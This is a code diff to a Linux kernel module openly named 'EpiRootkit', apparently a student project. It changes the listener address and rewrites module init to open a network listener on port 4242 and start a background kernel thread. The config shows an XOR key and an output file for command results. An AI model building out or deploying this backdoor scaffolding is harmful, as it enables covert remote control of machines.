@@ -33,7 +33,7 @@ MODULE_VERSION("0.1");
 // Global variables
 struct rootkit_config config = {
     .port = 4242,
-    .server_ip = "0.0.0.0",
+    .server_ip = "127.0.0.1",
     .buffer_size = 4096,
     .xor_key = "epita",
     .temp_output_file = "/tmp/rootkit_output",
@@ -262,34 +262,30 @@ static int listen_for_connections(void) {
         return ret;
     }
 
+    printk(KERN_INFO "EpiRootkit: Listening on port %d\n", config.port);
     return 0;
 }
 
 // Module initialization
 static int __init epirootkit_init(void) {
+    int ret;
+
     printk(KERN_INFO "EpiRootkit: Initializing...\n");
-    
-    // Initialize lists
-    INIT_LIST_HEAD(&module_list);
-    
-    // Initialize spinlock
-    spin_lock_init(&hook_lock);
-    
-    // Allocate non-paged memory
-    mem_manager.nonpaged_size = PAGE_SIZE;
-    mem_manager.nonpaged_memory = kmalloc(mem_manager.nonpaged_size, GFP_KERNEL);
-    if (!mem_manager.nonpaged_memory) {
-        printk(KERN_ERR "EpiRootkit: Failed to allocate non-paged memory\n");
-        return -ENOMEM;
+
+    ret = listen_for_connections();
+    if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to initialize network\n");
+        return ret;
     }
 
-    // Start listening for connections
-    if (listen_for_connections() < 0) {
-        printk(KERN_ERR "EpiRootkit: Failed to start listening\n");
-        return -EINVAL;
+    g_rootkit_thread = kthread_run(rootkit_thread, NULL, "epirootkit");
+    if (IS_ERR(g_rootkit_thread)) {
+        printk(KERN_ERR "EpiRootkit: Failed to create rootkit thread\n");
+        sock_release(g_connection_socket);
+        return PTR_ERR(g_rootkit_thread);
     }
 
-    printk(KERN_INFO "EpiRootkit: Initialized successfully\n");
+    printk(KERN_INFO "EpiRootkit: Module loaded successfully\n");
     return 0;
 }
 
